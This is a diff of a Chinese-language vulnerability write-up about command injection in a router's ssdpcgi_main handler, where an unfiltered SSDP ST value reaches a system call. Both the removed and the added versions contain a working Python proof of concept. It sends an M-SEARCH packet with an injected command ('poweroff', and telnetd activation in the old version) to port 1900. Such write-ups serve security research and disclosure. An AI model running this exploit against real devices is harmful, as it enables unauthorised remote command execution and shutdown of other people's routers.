@@ -16,7 +16,7 @@
 
 漏洞函数：`ssdpcgi_main` 
 
-命令注入：
+在处理 /ssdpcgi 时，SERVER_ID 的值用于拼接 `%s services %s:%s %s %s &` ，该字符串随后被传入 lxmldbc_system 进行系统调用。由于没有对 SERVER_ID 进行过滤，因此存在注入命令，实现 rce 。
 
 ![image-20210317223754651](https://gitee.com/mrskye/Picbed/raw/master/img/20210317223754.png)
 
@@ -30,30 +30,20 @@ import os
 import socket
 from time import sleep
 
-def config_payload(ip, port):
-    header = "M-SEARCH * HTTP/1.1\n"
-    header += "HOST:"+str(ip)+":"+str(port)+"\n"
-    header += "ST:urn:device:1;poweroff\n"
-    header += "MX:2\n"
-    header += 'MAN:"ssdp:discover"'+"\n\n"
-    return header
-def send_conexion(ip, port, payload):
-    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
-    sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2)
-    sock.sendto(payload,(ip, port))
-    sock.close()
-if __name__== "__main__":
-    ip = raw_input("Router IP: ")
-    port = 1900
-    print("\n---= HEADER =---\n")
-    headers = config_payload(ip, port)
-    print("[+] Preparando Header ...")
-    print("[+] Enviando payload ...")
-    print("[+] Activando servicio telnetd :)") 
-    send_conexion(ip, port, headers)
-    print("[+] Conectando al servicio ...\n")
-    # sleep(5)
-    # os.system('telnet ' + str(ip))
+ip = "192.168.0.1"
+port = 1900
+command = "poweroff"
+
+sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
+sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2)
+
+payload = "M-SEARCH * HTTP/1.1\n"
+payload += "HOST:"+str(ip)+":"+str(port)+"\n"
+payload += "ST:urn:device:1;{}\n".format(command)
+payload += "MX:2\n"
+payload += 'MAN:"ssdp:discover"'+"\n\n"
+
+sock.sendto(payload,(ip, port))
 ```
 
 > 公网机器：
